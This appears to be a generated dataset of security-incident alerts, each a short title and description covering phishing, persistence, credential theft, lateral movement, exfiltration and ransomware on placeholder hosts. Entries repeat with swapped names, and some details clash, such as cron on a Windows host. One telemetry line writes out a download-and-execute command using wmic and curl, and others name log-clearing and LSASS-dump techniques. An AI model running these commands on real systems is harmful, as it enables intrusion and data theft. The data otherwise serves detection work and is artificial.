title: Spear-phishing email with macro-laden attachment delivered to dave@example.com
description: Inbound email from 45.142.122.111 delivered an Office document with a malicious VBA macro to dave@example.com. Attachment opened on WIN-DC-PRIMARY; macro spawned cmd.exe and downloaded a stage-2 payload from a known Lazarus infrastructure.

title: Exploitation of public-facing web app on LIN-BUILD-CI03
description: WAF logs show SQL-injection and SSRF probes from 172.16.50.7 against the application on LIN-BUILD-CI03. One request returned 200 with internal cloud-metadata content. Likely exploitation of CVE-2024-1234.

title: Watering-hole exploit served from internal Confluence by 203.0.113.45
description: Internal Confluence page injected with malicious JavaScript by 203.0.113.45. Drive-by exploit triggered browser exploitation on multiple visitors including ops-lead@example.com. Linked to Lazarus TTPs.

title: Supply-chain compromise: malicious npm package on WIN-DC-PRIMARY
description: CI pipeline on WIN-DC-PRIMARY installed compromised npm package `event-stream`. Post-install hook executed reverse shell to 198.51.100.23. Build artefacts may be tainted.

title: Malicious USB autorun on air-gapped host WIN-DEVOPS-LT
description: USB device inserted on air-gapped WIN-DEVOPS-LT by cfo@example.com. AutoRun executed Python stager that collected local files. Data staged in C:\Temp\.

title: OAuth consent phishing targeting ceo@example.com
description: Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 91.134.231.15.

title: Obfuscated PowerShell dropper executed on LIN-OBS-LOGGER
description: PowerShell dropper executed on LIN-OBS-LOGGER by ceo@example.com; payload base64-encoded and decoded in-memory. Linked to MagicWeb ransomware staging.

title: Living-off-the-land: certutil download cradle on AWS-EC2-PROD-API
description: certutil.exe -urlcache invoked from cmd.exe on AWS-EC2-PROD-API. cmd.exe was spawned by outlook.exe. Payload downloaded from 172.16.50.7.

title: Container runtime abuse: malicious `docker run` on LIN-EDGE-VPN02
description: Unauthenticated Docker API on LIN-EDGE-VPN02 exploited from 198.51.100.23. Container with cryptominer spawned. CPU on host saturated to 95%.

title: Malicious WMI subscription on AZURE-VM-FIN-001
description: Permanent WMI event subscription created on AZURE-VM-FIN-001 by admin@example.com. Consumer runs encoded script. Persistence + execution mechanism.

title: Registry Run key persistence created by ops-lead@example.com on AWS-EC2-PROD-API
description: New value written to HKCU\Software\Microsoft\Windows\CurrentVersion\Run on AWS-EC2-PROD-API. Points to roaming binary signed with revoked cert. Linked to Volt Typhoon.

telemetry.rule: Persistence: Registry Run with revoked-cert signed binary

title: Scheduled task persistence on GCP-GKE-NODE-04
description: Hidden scheduled task created on GCP-GKE-NODE-04 by carol@example.com: triggers every 30 minutes, runs script from %APPDATA%\Roaming. Persistence mechanism.

title: Firmware implant detected on UEFI partition of WIN-FIN-DB01
description: UEFI secure-boot violation on WIN-FIN-DB01. Unknown module detected in firmware. Signature matches MosaicRegressor implant.

title: Backdoor cron job installed on WIN-HR-DESKTOP
description: /etc/cron.d entry created by svc-deploy@example.com on WIN-HR-DESKTOP. Reverse shell beacon to 203.0.113.45 every 5 minutes.

title: UAC bypass observed on MAC-LEGAL-LAPTOP
description: fodhelper.exe abuse on MAC-LEGAL-LAPTOP by svc-deploy@example.com; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.

title: Container escape via privileged pod on K8S-PROD-CLUSTER
description: Kubernetes privileged pod created on K8S-PROD-CLUSTER by eve@example.com. cgroup escape to host namespace observed. Node filesystem accessed.

title: Linux SUID binary abuse on LIN-DB-REPLICA
description: Custom SUID binary discovered in /tmp on LIN-DB-REPLICA; allows arbitrary command execution as root. Likely escalation by svc-deploy@example.com.

title: Memory-only fileless implant in svchost on MAC-CFO-LAPTOP
description: Process hollowing detected on MAC-CFO-LAPTOP: svchost.exe replaced with Cobalt Strike beacon to 10.0.99.42. No disk artefacts. Linked to Scattered Spider.

title: Indicator removal: Windows event log cleared on LIN-EDGE-VPN02
description: Security event log cleared on LIN-EDGE-VPN02 by frank@example.com. wevtutil.exe cl Security observed in command-line telemetry.

title: Disable security tooling on GCP-GKE-NODE-04
description: eve@example.com attempted to stop Defender, CrowdStrike, and Sysmon on GCP-GKE-NODE-04. Tampering telemetry triggered alert.

title: LSASS memory dump on AZURE-VM-FIN-001 by carol@example.com
description: comsvcs.dll MiniDump observed on AZURE-VM-FIN-001. lsass.exe memory dumped to C:\Windows\Temp\. Mimikatz signatures detected.

title: Brute-force credential spray against svc-deploy@example.com from 45.142.122.111
description: Credential spray from 45.142.122.111 against svc-deploy@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.

title: Kerberoasting from MAC-CFO-LAPTOP
description: Service account TGS tickets requested en-masse from MAC-CFO-LAPTOP by svc-backup@example.com. AES256 → RC4 downgrade observed. Mimikatz tooling indicators.

title: Active Directory DCSync from non-DC host AWS-EC2-PROD-API
description: Replication rights abused from AWS-EC2-PROD-API by carol@example.com. All domain NTLM hashes replicated. Severe credential exposure.

title: SAML golden-ticket: forged assertion targeting ceo@example.com
description: Forged SAML assertion detected for ceo@example.com. Attacker pivoted to Azure AD; account enumeration followed from 198.51.100.23.

title: Domain enumeration from LIN-K8S-NODE01
description: ldap discovery from LIN-K8S-NODE01 by svc-deploy@example.com: BloodHound-style queries enumerating users, groups, ACLs.

title: Network share enumeration on LIN-EDGE-VPN02
description: Mass SMB share enumeration from LIN-EDGE-VPN02 by svc-deploy@example.com; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.

title: Pass-the-hash from AZURE-VM-FIN-001 to LIN-EDGE-VPN02
description: Pass-the-hash lateral movement from AZURE-VM-FIN-001 to LIN-EDGE-VPN02 by ceo@example.com. Golden ticket indicators present. Linked to APT28.

title: RDP lateral movement from LIN-BUILD-CI03
description: Anomalous RDP session from LIN-BUILD-CI03 (ops-lead@example.com) to AZURE-VM-FIN-001 outside business hours. Source admin not normal for AZURE-VM-FIN-001.

title: WMI lateral execution from WIN-PROD-WEB02 to AWS-EC2-PROD-API
description: wmic.exe /node:AWS-EC2-PROD-API process call create observed from WIN-PROD-WEB02 by dave@example.com. Remote command execution; payload from 91.134.231.15.

telemetry.CommandLine: wmic /node:AWS-EC2-PROD-API process call create "cmd /c curl http://91.134.231.15/p.exe -o C:\Users\Public\p.exe && C:\Users\Public\p.exe"

title: Bulk PII download by ops-lead@example.com
description: ops-lead@example.com downloaded >10 GB of customer records from production database from LIN-DB-REPLICA. Outside normal access pattern.

title: Clipboard logging implant on WIN-DC-SECONDARY
description: Clipboard contents from WIN-DC-SECONDARY (ops-lead@example.com) being captured to %APPDATA%\Local\. Captures span 2 hours and include credentials and crypto addresses.

title: DNS tunnelling exfiltration from MAC-LEGAL-LAPTOP
description: DNS query volume from MAC-LEGAL-LAPTOP 50× baseline. TXT records contain base64-encoded payloads. Estimated exfil ~200 MB; destination 172.16.50.7.

title: Cloud storage exfil: data egress to attacker-controlled S3 from WIN-DC-PRIMARY
description: Egress from WIN-DC-PRIMARY to s3://atk-stage-91.134.231.15/dump/ by carol@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.

title: Personal Drive exfil by admin@example.com
description: admin@example.com on LIN-K8S-NODE01 uploaded 4 GB to personal Google Drive. Files include source code and customer PII.

title: DGA-based C2 traffic from MAC-LEGAL-LAPTOP
description: DGA traffic from MAC-LEGAL-LAPTOP observed; 200+ NXDomain replies/min, IoCs match Scattered Spider epoch 5. Beacons to 172.16.50.7.

title: HTTPS C2 beacon from LIN-DB-REPLICA to 198.51.100.23
description: Periodic HTTPS beacon from LIN-DB-REPLICA to 198.51.100.23 every 60 seconds with low jitter. JA3 fingerprint matches Cobalt Strike.

title: Ransomware encryption in progress on GCP-GKE-NODE-04
description: Mass file rename observed on GCP-GKE-NODE-04 (frank@example.com); ..enc extension applied to ~20 k files. Ransomware note R3ADM3-LockBit 3.0.txt found.

telemetry.rule: Ransomware behaviour: high-rate file rename + ransom note

title: Cryptominer execution on WIN-DC-SECONDARY
description: XMRig miner spawned on WIN-DC-SECONDARY; CPU saturated to 95%. Mining pool 172.16.50.7:5555. Linked to LockBit 3.0.

title: BEC: payment redirect by cfo@example.com
description: Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by cfo@example.com from AWS-EC2-PROD-API to threat-actor account. Linked to ALPHV/BlackCat.

title: Public S3 bucket exposing PII
description: S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 203.0.113.45.

title: Identity provider compromise — anomalous Azure AD sign-in for grace@example.com
description: Successful Azure AD sign-in for grace@example.com from 45.142.122.111 (impossible-travel from prior location). MFA satisfied via stolen session token.

title: DDoS volumetric flood targeting public-facing WIN-DEVOPS-LT
description: L4 SYN flood from a botnet (>1M PPS) targeting WIN-DEVOPS-LT. Edge mitigation engaged but service degraded for 12 minutes.

title: Insider preparing departure: large mailbox export by ops-lead@example.com
description: ops-lead@example.com exported full mailbox PST (8 GB) from AZURE-VM-FIN-001. HR flag: notice given last week.

title: Malicious Office add-in installed for grace@example.com
description: Office VSTO add-in registered under HKCU for grace@example.com on WIN-EXCHANGE-01; loads on every Outlook startup; beacons to 185.220.101.7.

title: GitHub PAT leaked and abused from 185.220.101.7
description: Personal access token belonging to grace@example.com used from 185.220.101.7 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.

title: EC2 instance metadata service abused on GCP-GKE-NODE-04
description: IMDSv1 abused on GCP-GKE-NODE-04; temporary IAM credentials for role exfilled to 198.51.100.23. CloudTrail shows AssumeRole from external.

title: Vendor admin password reset abuse for ops-lead@example.com
description: Password reset for ops-lead@example.com performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.

title: OAuth refresh-token theft for ops-lead@example.com
description: Refresh token for ops-lead@example.com replayed from 172.16.50.7. Granted access to mailbox + OneDrive without re-prompt.

title: Container image with embedded backdoor pulled by AWS-EC2-PROD-API
description: Image registry/repo:malicious-backdoor pulled by AWS-EC2-PROD-API. Layer scan flagged embedded netcat reverse-shell binary.

telemetry.rule: Image scan: embedded netcat reverse-shell binary

description: journalctl --rotate --vacuum-time=1s observed on K8S-PROD-CLUSTER by carol@example.com; recent journal entries purged. Indicator removal.

description: ops-lead@example.com downloaded >10 GB of customer records from production database from WIN-DC-PRIMARY. Outside normal access pattern.

title: Clipboard logging implant on WIN-PROD-WEB02
description: Clipboard contents from WIN-PROD-WEB02 (svc-deploy@example.com) being captured to %APPDATA%\Local\. Captures span 2 hours and include credentials and crypto addresses.

title: DNS tunnelling exfiltration from WIN-DC-PRIMARY
description: DNS query volume from WIN-DC-PRIMARY 50× baseline. TXT records contain base64-encoded payloads. Estimated exfil ~200 MB; destination 198.51.100.23.

title: Cloud storage exfil: data egress to attacker-controlled S3 from WIN-PROD-WEB02
description: Egress from WIN-PROD-WEB02 to s3://atk-stage-185.220.101.7/dump/ by ops-lead@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.

title: Personal Drive exfil by ceo@example.com
description: ceo@example.com on AWS-EC2-PROD-API uploaded 4 GB to personal Google Drive. Files include source code and customer PII.

title: DGA-based C2 traffic from GCP-GKE-NODE-04
description: DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Scattered Spider epoch 5. Beacons to 45.142.122.111.

title: HTTPS C2 beacon from WIN-DEVOPS-LT to 198.51.100.23
description: Periodic HTTPS beacon from WIN-DEVOPS-LT to 198.51.100.23 every 60 seconds with low jitter. JA3 fingerprint matches Cobalt Strike.

title: Ransomware encryption in progress on LIN-DB-REPLICA
description: Mass file rename observed on LIN-DB-REPLICA (heidi@example.com); ..enc extension applied to ~20 k files. Ransomware note R3ADM3-Emotet epoch 5.txt found.

telemetry.rule: Ransomware behaviour: high-rate file rename + ransom note

title: Cryptominer execution on MAC-LEGAL-LAPTOP
description: XMRig miner spawned on MAC-LEGAL-LAPTOP; CPU saturated to 95%. Mining pool 10.0.99.42:5555. Linked to APT28.

title: BEC: payment redirect by admin@example.com
description: Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by admin@example.com from WIN-FILE-SHARE to threat-actor account. Linked to APT29.

title: Public S3 bucket exposing PII
description: S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 91.134.231.15.

title: Identity provider compromise — anomalous Azure AD sign-in for carol@example.com
description: Successful Azure AD sign-in for carol@example.com from 91.134.231.15 (impossible-travel from prior location). MFA satisfied via stolen session token.

title: DDoS volumetric flood targeting public-facing MAC-CFO-LAPTOP
description: L4 SYN flood from a botnet (>1M PPS) targeting MAC-CFO-LAPTOP. Edge mitigation engaged but service degraded for 12 minutes.

title: Insider preparing departure: large mailbox export by heidi@example.com
description: heidi@example.com exported full mailbox PST (8 GB) from WIN-EXCHANGE-01. HR flag: notice given last week.

title: Malicious Office add-in installed for carol@example.com
description: Office VSTO add-in registered under HKCU for carol@example.com on WIN-DC-SECONDARY; loads on every Outlook startup; beacons to 45.142.122.111.

title: GitHub PAT leaked and abused from 45.142.122.111
description: Personal access token belonging to dave@example.com used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.

title: EC2 instance metadata service abused on WIN-PROD-WEB02
description: IMDSv1 abused on WIN-PROD-WEB02; temporary IAM credentials for role exfilled to 91.134.231.15. CloudTrail shows AssumeRole from external.

title: Vendor admin password reset abuse for frank@example.com
description: Password reset for frank@example.com performed by helpdesk in response to social-engineering call from 91.134.231.15. Token claimed within 90 seconds.

title: OAuth refresh-token theft for carol@example.com
description: Refresh token for carol@example.com replayed from 10.0.99.42. Granted access to mailbox + OneDrive without re-prompt.

title: Container image with embedded backdoor pulled by AZURE-VM-FIN-001

title: Privileged command run as service account on K8S-PROD-CLUSTER

title: Spear-phishing email with macro-laden attachment delivered to ops-lead@example.com
